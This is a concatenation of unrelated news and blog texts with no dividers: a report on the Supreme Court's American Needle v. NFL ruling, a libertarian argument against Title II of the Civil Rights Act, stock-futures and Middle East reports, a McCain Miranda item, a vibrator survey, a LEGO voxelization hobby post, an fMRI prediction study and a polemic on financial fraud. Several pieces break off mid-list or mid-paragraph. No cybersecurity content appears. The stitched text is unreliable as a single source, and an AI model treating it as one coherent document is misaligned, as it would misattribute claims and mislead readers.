The Supreme Court unanimously ruled against the National Football League over its exclusive contract with an apparel maker in one of the most important sports law cases in decades .
In a 9 - 0 decision Monday , the justices said the league can be considered 32 separate teams , not a single business .
The court allowed a lawsuit against the league to continue , saying the licensing of intellectual property " constitutes concerted action " that is not part of the broad antitrust protection enjoyed by professional baseball .
Such protection allows individual teams to act as one business when making a host of financial decisions , including marketing their logos and trademarks .
The outcome could affect other sports franchises with similar limited antitrust exemption , as well as businesses that have cooperative networks , such as credit card companies .
The National Basketball Association , the National Hockey League , the National Collegiate Athletic Association , NASCAR , professional tennis and Major League Soccer backed the NFL in its appeal , seeking similarly broad antitrust protection .
" Decisions by NFL teams to license their separately owned trademarks collectively and to only one vendor are decisions that ' deprive the marketplace of independent centers of decisionmaking , ' " Justice John Paul Stevens wrote for the court , " and therefore of actual or potential competition . "
The case involves a lawsuit from American Needle Inc. , an Illinois - based sports apparel maker that was one of several companies with long - standing contracts with NFL Properties , a separate corporate entity that develops , licenses and markets the intellectual property of each team .
But in 2001 , the league entered into an exclusive 10 - year contract with Reebok to manufacture hats , jackets and other clothing featuring team logos .
American Needle is no longer able to negotiate with individual teams .
Some fans have complained that the prices on such gear have skyrocketed in the absence of competition from other apparel makers .
A Baltimore Ravens " replica jersey " with the name of star quarterback Joe Flacco , for example , now is listed for $ 108 on the team 's Web site .
American Needle complained that the deal violated a 120 - year - old antitrust law designed to limit cartels and monopolies , and to foster fair competition in the marketplace .
The key section of the law bans business rivals from conspiring to blunt competition or hurt consumers , by either increasing prices or limiting choices .
" The court vindicated the position of American Needle , " said Glen Nager , attorney for the company .
The ruling reinstates the firm 's lawsuit against the NFL .
Nager said the result of the Reebok deal was that the league 's 32 teams " put all of their intellectual property under the control of a single licensee , Reebok , and prices [ went ] up by 150 percent . "
" The case has to go forward , and American Needle is entitled to its day in court , " Nager added .
He said he was not surprised by the unanimous decision .
The ruling overturned of a 7th U.S. Circuit Court of Appeals decision that the league was one , not 32 .
Baseball is the only sports league that enjoys complete antitrust protection .
The NFL has long sought similar status .
The dilemma is acute because of the unique nature of pro sports , including American football and its 32 teams .
Those teams , including top apparel sellers the Dallas Cowboys and the Pittsburgh Steelers , compete against each other on the field and off -- for victories , for players and for their own brands .
But the league maintains unilateral rules and structure that all teams must follow to ensure parity and an equal playing field .
The NFL negotiates national television contracts and deals with the players ' union through collective bargaining .
The league says trademark licensing primarily benefits the on - field competition .
" A sports league produces a single entertainment product , " the league told the high court , " a structured series of athletic competitions leading to a championship , that no member club could produce on its own . "
But American
Needle countered that the structure does not erase the fact that " the teams are separately owned and controlled profit - making enterprises .
They are actual and potential competitors in numerous areas , including the licensing of intellectual properties . "
The Obama administration supported neither side , saying the league can be considered a single business in some areas but not others .
Stevens noted that the ruling will not completely hamstring the league .
" Football teams that need to cooperate are not trapped by antitrust law , " he wrote .
" The fact that NFL teams share an interest in making the entire league successful and profitable , and that they must cooperate in the production and scheduling of games provides a perfectly sensible justification for making a host of collective decisions .
But the conduct at issue in this case is still concerted activity under the Sherman Act . "
The ruling throws the dispute back to the lower federal courts to sort out the parameters of a possibly reworked licensing agreement that presumably would favor American Needle .
Retail sales of NFL - licensed merchandise in the United States and Canada was about $ 3.2 billion in 2007 , according to the trade journal Sports Licensing Report .
The combined total for football , baseball , hockey , basketball and soccer is more than $ 9 billion annually .
Among those backing the league are credit card companies , fearing that a ruling against the NFL could set a precedent that would hurt the federation of banks that constitutes the credit card network for companies like Visa and MasterCard .
Workers ' rights groups feared that a win for the sports league could have boosted its power in other off - field activities , perhaps giving owners immunity from lawsuits in areas like television rights , video - game licenses , franchise relocation and possibly athlete salaries .
Unions also expressed concern that the current legal fight could lead to labor unrest and possible player strikes , since the leagues might be protected legally from accusations owners conspired to keep down salaries .
Athletes say salaries , free agency rights and pensions could also have been affected by a ruling against them .
The NFL Players Association backed American Needle in the high court appeal .
The case is American Needle v. National Football League ( 08-661 ) .
CNN Radio's Bob Costantini contributed to this report .
What Matters Are Consequences , Not Context
Should libertarians support Title II of the 1964 Civil Rights Act ?
David Bernstein believes they should .
David ’s position is understandable , and his arguments are well - crafted .
But libertarians should not only oppose Title II ; they should shout that opposition from the highest roof tops .
The essence of Bernstein ’s position is that discrimination in the pre-1964 South did not consist merely of actions by purely private actors , like employers or restaurant owners .
It also consisted of an explicitly racist legal regime that mandated discrimination in education , public accommodations , transportation , and more , as well as implicit government backing for extra-legal actions taken by private citizens ( who were themselves often police or other government officials ) against both whites and blacks who tried to deviate from the discriminatory regime .
Bernstein then argues that the federal government had two choices for ending Jim Crow : federal laws invalidating state and local Jim Crow laws , or a federal law banning discrimination , i.e. , Titles II and VII of the CRA .
The fact that Jim Crow was a government imposed and supported system is undeniable .
But Bernstein ’s prescription for ending Jim Crow is off the mark .
To begin , Title II is a bald - faced assault on a principle that libertarians hold dear : that private property is private .
This means libertarians should be incredibly suspicious of Title II and insist on an overwhelming case before violating this principle .
No such case exists .
Bernstein ’s argument is also suspect because he asserts , rather than demonstrates , that restricting federal actions to overturning Jim Crow laws – roughly , the goal of Titles I and III - VI – would not have been sufficient to break Jim Crow .
Yet much of the South was unenthusiastic about Jim Crow , whether for noble reasons or self - interest , so a CRA that merely targeted government discrimination would likely have changed the social norm , allowed non-discriminatory forces to emerge , and toppled the Jim Crow regime .
This is exactly what occurred in some instances , such as integration of state universities .
Plus , as Sheldon Richman rightly emphasizes , purely private mechanisms , from boycotts to migration of blacks from the South to the North , were putting real pressure on Jim Crow independent of government efforts .
Even if these problems with Bernstein ’s perspective are ignored , moreover , Title II was bad policy because it generated a range of undesired consequences that libertarians presumably abhor .
By violating the principle that private property is private , Title II created a precedent for other policies that violate property rights and have far less justification than Title II .
One example is smoking bans in restaurants .
If the law views these establishments as entirely the property of their owners , it is hard to defend laws that ban smoking since non-smoking customers are not required to frequent any particular restaurant .
If the law turns restaurants into “ public accommodations , ” however , then restaurants become places where the law can impose public health concerns and where customers have “ rights , ” other than just choosing not to frequent the restaurants they do not like .
Similar considerations apply to occupational health and safety regulation .
So long as any workplace is the private property of the owner , it is difficult to defend rules about safety equipment , hours of work , and so on .
These are concerns only for employers and their employees .
Once workplaces are somehow “ public , ” the door is open for the state to pursue various goals that libertarians find objectionable .
Mandatory maternity leave is a good example .
Most relevant to the civil rights debate , treating businesses as partially public sets the stage for government bans on private affirmative action .
Yet reverse discrimination practiced by private parties is a crucial way that markets , not government , can limit the negative impact of discriminatory preferences exhibited by some restaurants owners and employers .
A different negative consequence of Title II is institutionalizing the view that blacks are too weak to overcome discrimination on their own .
This is not just insulting ; it is counter - factual .
Private actions like boycotts and migration were undermining Jim Crow before the Civil Rights Act , and this process would have continued .
In the North , where governments did not ( generally ) impose discrimination , blacks were succeeding on their own even more .
Under the CRA and its sequelae such as affirmative action , however , many people view black success with suspicion because it might have been generated by federal law .
Title II also eliminates “ transparency , ” meaning the ability for everyone , black or white , to know who is racist and who is not .
In response to a post on the Rand Paul Incident , one of my blog readers wrote the following :
I agree wholeheartedly that he [ Paul ] should have stood his ground and explained why his view is not a racist view , but that it , in fact , supports ones humanity .
The last thing that I would want to do is to spend money at an establishment that did not want me .
By passing a law that eliminates transparency , I , as a black man , lose the ability to discern who wants my business and who does not .
Would n’t it be better for people to patronize businesses that desire their business ?
I definitely believe so .
The commenter makes an excellent point ; by requiring non-discrimination , Title II makes it easier for racist whites to take money from blacks .
Thus whether or not the CRA had the beneficial impact of breaking the discriminatory social norm that existed under Jim Crow — and any such effect is easily overstated , since norms were changing before CRA — it has other effects on social norms that are plausibly worse .
Since private mechanisms , and federal actions against Jim Crow laws , would have generated the gains achieved by blacks anyway , Title II means we are stuck with the bad effects on social norms while getting only passing benefit from the ( alleged ) good effect .
The most stunning aspect of the Rand Paul episode is not that Paul voiced objections to the CRA , nor that he backtracked once the political firestorm erupted .
The most surprising aspect , instead , is how many libertarians have voiced support for the CRA in the aftermath .
The exact reasons for libertarian support are not clear , but it seems many libertarians have concluded that , whatever they believe in their guts , opposition to the CRA is so incendiary that libertarians must find a way to make peace with it .
Thus they have trotted out arguments about historical context and social norms to defend a position that seems antithetical to everything libertarians believe .
Libertarians are , of course , free to believe whatever they wish about the CRA .
Perhaps many find the historical context and social norm arguments convincing , although I suspect they would be skeptical of such arguments in other contexts .
But if libertarians are supporting Title II out of political expediency , they are on a fool ’s errand .
Libertarians are never going to be widely popular or get elected in significant numbers ; we hold far too many positions that are anathema in the political arena .
What libertarians can do is attempt to keep both sides honest .
That means sticking to our principles no matter how awkward that might be .
Stock futures surge on rescue plan
NEW �YORK �( CNNMoney.com ) -- U.S. stock futures soared Monday , positioning Wall Street toward joining a worldwide rally , after European Union officials approved a $ 900 billion bailout to stabilize the euro and rescue debt - choked Greece .
At 9:15 a.m. ET , Dow Jones industrial average ( INDU ) , S&P 500 ( SPX ) and Nasdaq ( COMP ) futures were all sharply higher .
Futures measure current index values against perceived future performance and offer an indication of how markets may open when trading begins .
" I think it 's obvious what 's going to move the market today , considering what went on in Europe this weekend , " said Peter Boockvar , chief market strategist with Miller Tabak & Co .
The European rescue package , valued at more than $ 1 trillion , has three main components .
The biggest provision will use nearly $ 570 billion to create government - backed loans meant to shore up confidence in shaky credit markets .
" Europe has taken its playbook from the [ U.S. ] Fed[eral Reserve ] , " Boockvar said .
" It 's chosen to inflate its way out of the debt problem rather than really deal with it . "
On Friday , stocks slumped as investors remained uncertain about Europe and spooked about Thursday 's wild market swings , in which the blue - chip Dow Jones industrial average fell nearly 1,000 points before rebounding by nearly two - thirds .
The three major indexes ended in negative territory Friday for the year to date .
World markets : Stock markets around the world advanced on the euro zone news .
In afternoon trading in Europe , the CAC 40 in France surged 7 % .
Britain 's FTSE 100 and Germany 's DAX were also sharply higher , with gains of almost 5 % .
In Asia , Japan 's Nikkei index ended Monday 's session 1.6 % higher and the Hang Seng in Hong Kong rallied 2.8 % .
On Monday , the Bank of England announced it will leave its key interest rate unchanged at 0.5 % .
Dollar :
The dollar was down 1.4 % against the euro and fell 1.6 % on the British pound , but it was up 1.5 % on the Japanese yen .
Bonds : Treasury prices fell sharply Monday , pushing the benchmark 10 - year yield up to 3.60 % .
Bond prices and yields move in opposite directions .
RAMALLAH — Israeli nuclear whistle - blower Mordechai Vanunu has been sentenced to another three months imprisonment for allegedly refusing to perform community service in West Jerusalem .
Vanunu , a former employee at Israel ’s secret Dimona nuclear facility in the Negev desert , spent 18 years in jail after he revealed information about the facility to the international media .
He was kidnapped by Israel ’s intelligence agency Mossad in Rome and brought back to Israel where he served his sentence , most of it in solitary confinement .
Vanunu was ordered on his release not to speak to foreigners or the international media , an order he has broken numerous times .
However , remarks by the prosecutor that Vanunu still poses a threat to Israel ’s security decades after he was sentenced and had already revealed all he knew has raised questions about whether he is being unnecessarily persecuted .
Just how much power Israel ’s domestic intelligence agency the Shin Bet has and whether Israel might be turning into a police state has also been the subject of media speculation recently .
This follows the secret midnight arrests of a Turkish national and several Israeli - Arabs on espionage allegations and the gag orders surrounding the arrests .
There are a number of other incidents involving the Shin Bet .
At the beginning of the year the Shabak , as the Shin Bet is also known , placed a gag order on the circumstances surrounding the arrest and interrogation of Israeli journalist Anat Kam .
Kam is alleged to have copied secret Israeli Defense Forces ( IDF ) documentation on extra-judicial killings of Palestinian resistance fighters with the liquidations being carried out in contravention of Israeli court rulings .
Israelis were the last to find out about Kam ’s house arrest , months after it happened , when it made big news internationally and was reported extensively on the Internet .
A week ago two Israeli Arabs , Ameer Makhoul from Haifa , the director general of the Ittijah charity , and Omar Said , a member of the Balad political party , were arrested by the Shin Bet and heavily armed anti-terror squads during night raids on their family apartments .
The two have been accused of passing on information to the Lebanese resistance organization ’s , Hezbollah .
The Shin Bet again placed a gag on the arrests until a few days ago with some of the details still remaining secret .
Critics argue that the allegations are flimsy at best and have more to do with Makhoul supporting a boycott of Israeli settlement goods and his campaigning for equal rights for Israeli - Arabs .
Speculation is also rife that Makhoul ’s brother Amir ’s ( a former member of the Israeli Knesset ) speech to the Knesset , about Israel ’s clandestine nuclear armaments and his comments that Israel should begin nuclear disarmament , had already focused security attention on the family .
Makhoul ’s arrest comes at a time when the International Atomic Energy Agency ( IAEA ) is slated to discuss Israel ’s nuclear program for the very first time ever at its forthcoming June meeting .
A number of other Palestinian grassroots activists , involved in the Boycott , Disinvestment Sanctions ( BDS ) campaign and protests against Israel ’s separation barrier , remain incarcerated in Israeli jails in administrative detention or without trial .
Abdullah Abu Rahme , a member of Bili ’in ’s village committee against Israel ’s separation barrier , which has expropriated large swathes of the village ’s land , has been held for more than five months in administrative detention .
The Israeli authorities accuse him of incitement in planning weekly non-violent demonstrations , supported by Israeli and international activists , against the wall as well as possession of arms .
The latter accusation relates to his arrangement of used teargas canisters and rubber - coated metal bullets into a peace sign after the IDF had fired them at protestors .
Another Shin
Bet gag order was placed several weeks ago on the arrest in the West Bank of Turkish national Izzet Shahin , a volunteer for the Turkish NGO Foundation for Human Rights and Freedoms and Humanitarian Relief ( IHH ) .
Izzet is accused of belonging to IHH , an Islamic group outlawed by Israel , and of helping to organize an aid boat to Gaza as part of the flotilla of humanitarian relief which is heading towards the coastal territory at the end of May .
The deportation several weeks ago of a famous Spanish clown from Israel ’s Ben Gurion international airport on the grounds he intended to make contact with " terror organizations " while in Ramallah has seen some Israeli commentators calling the Shin Bet " the real clowns . "
Ivan Prado had planned to take part in an international clown festival in Ramallah but after six hours of interrogation by the Shin Bet he was refused entry to Israel and deported to Spain on " security grounds . "
The incident caused embarrassment at the Israeli Foreign Ministry and heightened tensions with the Spanish government .
Meanwhile , a number of Israeli leftists are facing trial for " rioting and assaulting police " during a non-violent protest in the East Jerusalem suburb of Sheikh Jarrah .
They were protesting Israel ’s building of illegal Jewish settlements and Judaization of the neighborhood at the expense of the Palestinian locals .
The protestors claim the charges are trumped up and they were arrested after they refused to disperse during a demonstration approved by an Israeli court .
In another development , IDF military intelligence has also caught flak for over - ruling an Israeli court decision to fully open a main highway in the West Bank to Palestinian motorists .
Highway 443 has been used by Jewish settlers exclusively for years even though it is built on Palestinian land and it runs alongside many Palestinian villages .
Despite the court ruling the IDF will only open parts of the highway to Palestinian motorists and only after extensive security checks at roadblocks at the highway ’s entrance .
In further breaking news several Palestinian medical students have been refused entry permits to Jerusalem to continue their studies at Jerusalem ’s Al Quds University after they refused to spy for the Shin Bet on student activity there .
The Shin Bet declined to discuss the issue other than to say the permits had been denied " on security grounds . "
( Inter Press Service )
It would have been a serious mistake to have read the suspect in the attempted Times Square car bombing his Miranda rights , Sen. John McCain ( R - Ariz . ) said Tuesday .
McCain , the ranking member of the Senate Armed Services Committee and a longtime leading Republican on national security issues , said he expected the suspect in the case could face charges that might warrant a death sentence if convicted .
" Obviously that would be a serious mistake ... at least until we find out as much information we have , " McCain said during an appearance on " Imus in the Morning " when asked whether the suspect , 30 - year - old Faisal Shahzad , a naturalized American citizen from Pakistan .
" Do n't give this guy his Miranda rights until we find out what it 's all about , " McCain added during an appearance on the Imus show , which is broadcast by the Fox Business Network .

McCain 's remarks echo Republican complaints in the aftermath of the attempted bombing of a flight en route from Amsterdam to Detroit on Christmas Day , when Umar Farouk Abdulmutallab , the suspect in that case , was immediately Mirandized and given full criminal rights .
Republicans say that suspects like Abdulmutallab and potentially Shahzad should be classified as an " enemy combatant , " which gives authorities more leeway in seeking intelligence through interrogation and other methods .
The Arizona Republican , however , said he expected the criminal justice system to play itself out in such a way that Shahzad would face the death penalty , if convicted .
" There 's probably about 350 different charges he 's guilty off -- attempted acts of terror against the united States , attempted murder , " said McCain , cautioning that he's not privy to the charges with which Shahzad might be charged .
" I 'm sure there 's a significant number to warrant the death penalty . "
McCain said the treatment of the defendant in this case would serve as an example to would - be terrorists in the future .
The veteran senator also saved praise on law enforcement authorities in New York and in the federal government for their work in apprehending Shahzad , who was detained Monday night while trying to board a flight to Dubai , UAE .
Shahzad was detained just over 48 hours since the car bomb he was alleged to have planted in Times Square was discovered and disarmed .
He 's expected to appear to face charges Tuesday in federal court .
McCain said Shahzad 's apprehension " gives you a little encouragement about the improvements we 've made since 9/11 . "

MORE than four decades after the sexual revolution , the word “ vibrator ” still has the power to elicit blushes , discomfort , snickering .
And yet , according to the first academic , peer - reviewed studies of vibrator use , it is nearly as common an appliance in American households as the drip coffee maker or toaster oven .
Fifty - three percent of women and nearly half of all men report having used a vibrator , according to two new national surveys from Indiana University recently published in The Journal of Sexual Medicine .
And what the surveys make clear is that the vibrator  dismissed as a “ masturbatory machine ” for “ sexually dysfunctional females ” in The Journal of Popular Culture back in 1974  is being used by couples for shared pleasure .
Eighty - one percent of women and 91 percent of men who ’ve used one report having done so with a partner .
“ What this tells us is we ’ve reached a tipping point , ” said Debby Herbenick , an author of the studies along with her Indiana University colleague Michael Reece .
“ Something once regarded as exotic has become commonplace . ”
It was only after hours of searching that I finally came up with what I was looking for : a way to take a polygon mesh ( OBJ or similar ) and convert it into a blueprint for building LEGO sculptures .
Do n't get me wrong , there are tons of tools out there for LEGO CAD .
But strangely none of them mention being able to go from a mesh to a LEGO layout .
It 's surprising , since it seems like such a natural fit .
The rise of 3D printers has rejuvinated interest in voxels , voulmetric pixels , and as evidenced by all the LEGO sculpture artists we seem to be in a golden age of LEGO .
Armed with Blender and a giant LEGO collection , I set out to get the computer to do the hard work for me .
I used Blender , graph paper , a pencil , and of course lots of LEGOs .
Step 1 : Voxelizing a Utah teapot
Let me preface this by saying that the Blender UI is not for the faint of heart .
I took classes on Rhino and 3DSMax in college , and thought to myself " how different could it be ? "
The answer : very .
If you 're new to blender , do n't fear the manual .
You 're going to need it , particularly the parts on installing / using python scripts .
To voxelize the teapot I used a script called Add Cells which covers the surface of any object with any other object .
First I imported the teapot , and scaled it up a bit .
Then I created my " fundamental unit " of LEGO .
LEGOs have an aspect ratio of 6:5 , so I created a 1×1 LEGO , a 0.6×0.5×0.5 rectangular prism in Blender .
Selecting both the teapot and my 1×1 lego I ran the Add Cells script ( go to the Scripts menu –> Add -> Cells ) .
I chose the Teapot for my object to be voxelized and the 1×1 LEGO as my voxel model .
Tada !
A blocky teapot !
Step 2 : Graphing each layer on paper
In order to make the build process easier , I went through layer by layer and drew a map of each layer on graph paper .
This way when building with LEGOs I could shade in with a pencil each voxel I 'd built .
It sounds redundant , but when things all start looking the same after a few minutes and something is n't lining up , it 's very helpful .
To see one layer at a time in Blender I went into Sculpture Mode , side view , and used ctrl + shift + right mouse to select and hide all but the layer I wanted to see .
Then I switched to Top view and copied the layer onto my graph paper .
By the end I had a sheet of paper full of wobbly circular outlines .
Step 3 : Building it with LEGOs !
The completed model uses 244 LEGOs , many of which are tiny 1×1 and 1 ×2 bricks .
The model is hollow , but the walls need to be fairly thick to be able to support the top .
As it is I probably should have made things a little thicker ; putting the last two layers on was a delicate operation .
I built each layer sequentially .
There were a few overhang pieces near the bottom which I had to append to the layer above them , since they could n't anchor to anything below .
Overall the project took about 4 hours , with a break in the middle for breakfast , church , etc .
Total LEGO count for the project was 244 individual bricks , distributed thusly :
* Scan predicted 75 percent of behavior
* People were right about themselves just half the time
* Technique might enhance advertising , education efforts
WASHINGTON , June 22 ( Reuters ) - Brain scans may be able to predict what you will do better than you can yourself , and might offer a powerful tool for advertisers or health officials seeking to motivate consumers , researchers said on Tuesday .
They found a way to interpret “ real time ” brain images to show whether people who viewed messages about using sunscreen would actually use sunscreen during the following week .
The scans were more accurate than the volunteers were , Emily Falk and colleagues at the University of California Los Angeles reported in the Journal of Neuroscience .
“ We are trying to figure out whether there is hidden wisdom that the brain contains , ” Falk said in a telephone interview .
“ Many people ‘ decide ’ to do things , but then do n’t do them , ” Matthew Lieberman , a professor of psychology who led the study , added in a statement .
But with functional magnetic resonance imaging or fMRI , Falk and colleagues were able to go beyond good intentions to predict actual behavior .
FMRI uses a magnetic field to measure blood flow in the brain .
It can show which brain regions are more active compared to others , but requires careful interpretation .
Falk ’s team recruited 20 young men and women for their experiment .
While in the fMRI scanner they read and listened to messages about the safe use of sunscreen , mixed in with other messages so they would not guess what the experiment was about .
“ On day one of the experiment , before the scanning session , each participant indicated their sunscreen use over the prior week , their intentions to use sunscreen in the next week and their attitudes toward sunscreen , ” the researchers wrote .
After they saw the messages , the volunteers answered more questions about their intentions , and then got a goody bag that contained , among other things , sunscreen towelettes . ”
“ A week later we did a surprise follow up to find out whether they had used sunscreen , ” Falk said in a telephone interview .
About half the volunteers had correctly predicted whether they would use sunscreen .
The research team analyzed and re-analyzed the MRI scans to see if they could find any brain activity that would do better .
Activity in one area of the brain , a particular part of the medial prefrontal cortex , provided the best information .
“ From this region of the brain , we can predict for about three - quarters of the people whether they will increase their use of sunscreen beyond what they say they will do , ” Lieberman said .
“ It is the one region of the prefrontal cortex that we know is disproportionately larger in humans than in other primates , ” he added .
“ This region is associated with self - awareness , and seems to be critical for thinking about yourself and thinking about your preferences and values . ”
Now , Falk said , the team is looking for other regions of the brain that might add to the accuracy of the technique .
While the findings can be important for advertisers seeking to hone a motivational message , they can be equally important for public health experts trying to persuade people to make healthier choices , Falk said .
The team is now preparing a report on experiments to predict whether people would quit smoking after seeing motivational messages .

Unhinged : When Concrete Reality No Longer Matters to the Market ( and What to Do About It ) ( May 15 , 2010 )
I am honored to present one of the very best ( and most engaging ) summaries of our broken financial system on the entire Web .
Unhinged : When Concrete Reality No Longer Matters to the Market ( and What to Do About It )
by Zeus Yiamouyiannis , Ph.D. Introduction Something profound has happened , obscured by all the concerns about economic details and speculation about whether we are in a deep recession  or a  depression ,  a nascent recovery  or a  W shaped downturn .
We no longer have a global economic system that is tethered to concrete reality .
Parasitic , amoral , slight - of - hand value - shuffling ( what I would call the unreal economy  ) has effectively trumped the real economy ,  the production and exchange of meaningful goods and services .
Worse , weve let it happen with our acquiescence , our hope that we can just ride this one out , and our denial of what we sense intuitively to be true pervasive fraud in the conduct of global financial business and massive counterfeiting in the establishment of value .
Weve allowed big banks and affiliated institutions to simply concoct fake wealth out of thin air , and we have legitimized and rewarded these concoctions with a massive transfer of real wealth to a very small but powerful oligarchy through unregulated private bets backed by public taxpayer money , stratospheric fees siphoned from transactions , predatory lending , and private equity cannibalization of once - productive firms .
A global economy mediated by an acceptance of a standardized , reality - based rule of law and value between nations has given way to the shrouded anarchy of transnational banks as overriding powers driven by their own brand of anti-public interest .
What constitutes value has migrated from actual value , based in something you earn and related to something you can actually concretely use , to references to value ,  some number merely assigned to some financial instrument attached to some good or service somewhere several degrees removed from its source .
( Think mortgage backed securities  where the actual deeds to properties are no longer even in the picture after extensive  packaging  and repackaging . )
This is all a fancy way of playing the age old game , externalize liabilities , internalize gains , but on an unprecedented and potentially cataclysmic scale .
Just as with political coverage that largely deals with the horse race ,  personalities , gaffes , and likeability of candidates over actual policy , financial coverage has concerned itself with a relentless boosterism , tea leaf reading , and a host of other trivialities while the structural rot goes unreported .
Abstractions like the velocity of money ,  along with whitewashing indicators like trading volume are used to gauge the health of an economy without sorting out whether such indicators are attached to some productive , underlying activity or asset .
This all serves to create a convenient smoke screen for moneyed interests , and progressively makes the new normal one that thrusts citizens deeper into debt servitude .
Post Mortem and Review A post mortem is in order .
The elements of this worldwide con game are remarkably simple , not complex at all .
Apparently you only need a few things to make a mockery of the entire global economic system , and big banks garnered these few important things through regulatory capture :
1 ) Unregulated , unenforced rules ( particularly for derivatives )
2 ) license to mark to model ( assign your own values to your assets )
3 ) ability to peg present value to irrational expected future returns ( based on unlimited , exponential growth )
4 ) infinite leverage ( no effective requirements for reserve capital in unregulated  shadow markets )
5 ) massive size , so that the bank is " too big to fail "
6 ) non-transparency and non-accountability .
This combined with the moral , social , personal , and cultural approval of maximizing profit at any cost , incentivizes massive fraud and counterfeiting .
How could this be otherwise , given the premises ?
So here we have a system where you can 1 ) make up your own rules , 2 ) establish any value for any asset you choose , 3 ) inflate that value a hundred fold based on ostensible future value and returns , 4 ) leverage that inflated value another thousand or a million fold simply on your say - so , enough to buy up multi-billion dollar firms if you choose , 5 ) lean on taxpayer bailouts when you get into trouble , and 6 ) do this without any disclosure or accountability , all based upon a self - interested formula you concoct to enrich yourself .
This is less sin or malfeasance than just plain lunacy .
Yet , this is what we have and what we have allowed to gain the upper hand .
Literally , following the same formula with a little solid reputation sprinkled on , I can value my cats litter box at a million dollars , trade on its ostensible increased future value to skim myself a tidy sum in profit and transaction fees , leverage my marked to model value of that litter box , a million fold to buy up Chrysler .
I can then loot Chrysler , stripping it of its real wealth and infrastructure , gut jobs , etc. for short term boosts to profits , and then walk away a billionaire .
I can give any reason or no reason at all for what I m doing .
I dont have to tell anyone a thing , and no one is going to come after me .
If they do come after me  it will be to lard me with hundreds of billions of dollars of taxpayer money to keep the national or global economy from collapsing .
Talk about throwing good money after bad .
The most I can lose is my litter box and now that everyone has a stake in the con , they have every incentive to cover it up and make me whole , both to protect against their anxiety and their feelings theyve been conned , and to maintain a functioning dysfunctional system .
The Historical Proof
Let me stress again :
This is not mere moral hazard ;  this is sheer lunacy of the highest order .
Moral hazard assumes a rational framework where the good ( productivity , efficiency , etc. ) is rewarded .
We have currently already established and incentivized as rational  an irrational framework where outright , willful lying , theft , fraud , and counterfeiting are rewarded .
The more parasitic and more inefficient I am in this framework , the more I make .
The more I trade an asset back and forth , the more fees I get .
Even if those fees eclipse the entire value of the asset in question , I am rationally  compelled to continue trading as long as someone else is paying .
If I can inflate the value of my asset at will and pay Moodys or Standard and Poors to give me a AAA rating whos going to know ?
It is sobering to contemplate that the market for unregulated derivatives alone , has exceeded the global GDP at a total volume exceeding 600 trillion dollars and possibly more than a quadrillion dollars ( 1,000,000,000,000,000 or a million billion dollars ) .
Exhibit 1 : The Private Equity Tax Loophole Scam : Joshua Kosman , author of The Buyout of America : How Private Equity Will Cause the Next Great Credit Crisis does a pretty good run-down on this scam on NPRs November 16 , 2009  Fresh Air .
According to the transcript , private equity firms ( the new name for leveraged buyout firms ) like the notorious Carlyle Group have purchased companies in a variety of industries and are now set to default on about a trillion dollars of their debts , close to the amount of default for the entire sub - prime mortgage market .
Taking advantage of cheap money and lax lending , private equity firms will likely bankrupt about half of the 3,100 companies they bought , which currently employ one in ten American workers .
Kosman estimates about 1.9 million jobs would be lost as a result .
By squeezing out workers , cutting research and development , private equity firms sell to each other at a massive short - term profit that devastates long - term viability .
With the mattress industry , private equity firms bought Sealy , Simmons , and Serta .
They then proceeded to essentially fix prices between themselves raising prices while lowering quality and durability .
This worked short term , until competitors like Tempur - pedic gained market share and left the overpriced junk offered by their hollowed - out leveraged companies on the shelves .
Market share and profitability for Serta dropped below pre-takeover levels .
The same formula is used with hospitals and other industries .
Take a productive company with some reputation and loyalty , trash it , counting on lag time for people to depart , and make off with loot when it crashes .
Incredibly , going back to our theme of the market being unhinged  from concrete reality , these private equity firms purchase companies with debt .
Literally they put their fractional money  down , and get the firm they are buying to take on the remainder of the debt !
Ostensibly , since interest is tax - deductible , the reasoning goes , tax savings for the company accepting the debt will outweigh the disadvantages of paying down the interest and taking on the risks .
Of course , unsurprisingly , reality intercedes in a different direction .
The scam is exposed .
The equity firm walks away , and the company goes bankrupt .
Many jobs are lost , and the whole country pays .
Exhibit 2 : Fabricated Supply and Demand Scam : The Speculative Run-Up in Oil Remember in the mid-2000s when the media kept falling over itself to explain why gas prices were unhinged from oil supply and unrelated to any impinging world and seasonal events .
Back then it was all explained away by mumbo- jumbo about the price of refining , and how certain refineries were off line .
By 2007 , the U.S. had begun a serious inquiry , with some settlements won for price fixing by retailers ( the bad apple strategy  that always leaves the big boys untouched ) , and , soon after , the prices settled down .
Now we have news of a new unexplained buoyancy in gas prices .
This time commentators arent even bothering to pretend it has any rational connection with present supply and demand .
Oil supplies are abundant , demand is down due to unemployed people staying home , and the summer driving season has yet to arrive .
Instead prices are being expectation driven by speculators betting future upticks in the world economy , particularly Chinas , will increase demand for oil .
The bitter irony of all this future possible value being more important than the present actual value is that this speculation could actually drive prices beyond the reach of people with less money now due to the poor economy and squash the very recovery that would give rise to legitimately higher prices in the future .
Again , a certain kind of twisted , counterproductive logic is allowed to run the market without correction from present , concrete conditions .
Exhibit 3 : The Double Whammy Scam : Profiting from Designed Failure and Placing Bets Backed by Counterfeit Value
A recent government suit alleges that Goldman Sachs colluded with a billionaire short seller , John Paulson , to defraud investors and construct a package of mortgage linked derivatives designed to blow up  so Paulson could make a fortune .
Continuing from AP reporter , Bernard Condons , article in the Washington Post , ( Does Goldman Case Tarnish Cassandras of the Crash ?
April 21 , 2010 ) : So - called short sellers , like Paulson , profit when stocks , mortgages or other assets they bet against lose value .
In other words , the game of guessing which way prices would go was allegedly rigged in this case .
That sounds bad enough .
But some Wall Street veterans say the real tarnish on our erstwhile housing heroes is the package itself - regardless of whether it was designed to fail .
By just linking to mortgages but not actually containing any , the Paulson package and others marketed by banks upped bets on housing to more than even the mortgages in existence , making the overall losses much bigger now that boom has turned to bust .
" Normally short sellers add rationality to a runaway marketplace , " says Charles Smith , who oversees $ 1 billion at Fort Pitt Capital Group .
" But in this case they were adding rocket fuel to the fire . "
The fuel here is devilishly difficult to understand .
Called synthetic collateralized debt obligations ( CDOs ) , these packages contained a series of wagers on whether thousands of homeowners would continue to pay their loans .
The key thing to grasp about them , and the part that explains how they magnified housing losses , is that they do n't actually own any mortgages and so are n't limited by the number of such loans .
Instead , these investments merely make " reference " to real mortgages to determine which side of the wager wins .
( my emphases )
Did you catch that ?
This language confirms the divorce of concrete reality and the market : 1 )  Linking to mortgages but not containing any , 2 ) not actually owning any mortgages but being able to bet on them , 3 ) making reference to real mortgages to determine which side of the wager wins , 4 ) wagering bets not limited  by material assets .
The last point could theoretically involve an infinite number of bets and infinite returns on those bets .
This is well analyzed except for one point :
The core of this dealing is deceptively simple , even if the instruments themselves are deliberately complex .
